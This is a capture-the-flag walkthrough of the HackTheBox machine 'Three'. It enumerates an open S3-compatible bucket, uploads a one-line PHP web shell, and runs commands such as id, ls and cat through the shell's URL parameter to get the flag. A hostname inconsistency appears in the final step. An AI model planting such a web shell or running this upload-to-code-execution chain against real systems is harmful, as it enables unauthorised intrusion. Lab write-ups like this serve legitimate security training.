
**Three (HTB) Walkthrough**

**1. Reconnaissance**

An initial full TCP port scan was performed against the target system to identify all exposed network services.

    nmap -sS -sV -Pn -p- <target-ip>

Scan options explanation:  
• -sS performs a TCP SYN scan to identify open ports  
• -sV enables service and version detection  
• -Pn disables host discovery and assumes the host is online  
• -p- scans all 65535 TCP ports

The scan revealed the following open TCP ports:  
• 80 – HTTP

Since service and version detection was already enabled during the full port scan, no additional individual port scans were required.

**2. Hostname Resolution**

To ensure proper hostname resolution and correct web application behavior, the target IP was added to the local /etc/hosts file.

    sudo nano /etc/hosts

An entry mapping the target IP to the corresponding hostname was added:

    <target-ip> thetoppers.htb

This step was required due to name‑based virtual hosting.

**3. Service Identification**

Port 80 was identified as an HTTP web service hosting a website that referenced external storage functionality. The application behavior suggested the use of object storage rather than a traditional filesystem backend, indicating a possible S3 or S3‑compatible storage service.

**4. Virtual Host Enumeration**

Further inspection of the web application and HTTP headers suggested additional virtual hosts. Virtual host enumeration revealed a storage‑related subdomain.

Once discovered, the new hostname was added to /etc/hosts:

    <target-ip> s3.thetoppers.htb

This allowed direct access to the storage service.

**5. Storage Service Discovery**

Accessing the newly discovered subdomain revealed an S3‑compatible object storage service exposed over HTTP.

This service followed the same API structure as Amazon S3 but was self‑hosted. Importantly, no authentication was required to interact with it.

**6. Bucket Enumeration**

Using the AWS CLI with a custom endpoint, available buckets were enumerated.

    aws --endpoint-url http://s3.thetoppers.htb s3 ls

The enumeration revealed a publicly accessible bucket:

    thetoppers.htb

The bucket name represents the entire bucket, not just the domain.

**7. Malicious File Creation (PHP Web Shell)**

A simple PHP web shell was created locally to allow command execution on the target system.
    
    <?php
    system($_GET['cmd']);
    ?>

This shell executes system commands supplied via the cmd GET parameter.

**8. Arbitrary File Upload**

The bucket allowed unauthenticated file uploads. The malicious PHP file was uploaded using the S3 API.

    aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php

Because the bucket contents were directly served by the web server, the uploaded file became accessible via the browser.

**9. Remote Code Execution**

The uploaded shell was accessed through the web server:

    http://thetoppers.htb/shell.php?cmd=id

Successful command execution confirmed remote code execution with the privileges of the web server user.

**10. Flag Discovery**

Using the web shell, directory enumeration was performed to locate the flag.

    http://three.htb/shell.php?cmd=ls

    http://three.htb/shell.php?cmd=cat /path/to/flag.txt

The flag was retrieved successfully. No privilege escalation was required.

**11. Exploitation Outcome**

The system was compromised due to a misconfigured S3‑compatible storage service that allowed unauthenticated listing and uploading of objects. Because uploaded files were executed by the web server, this directly resulted in remote code execution.

No SSH access, credential theft, or privilege escalation was required.
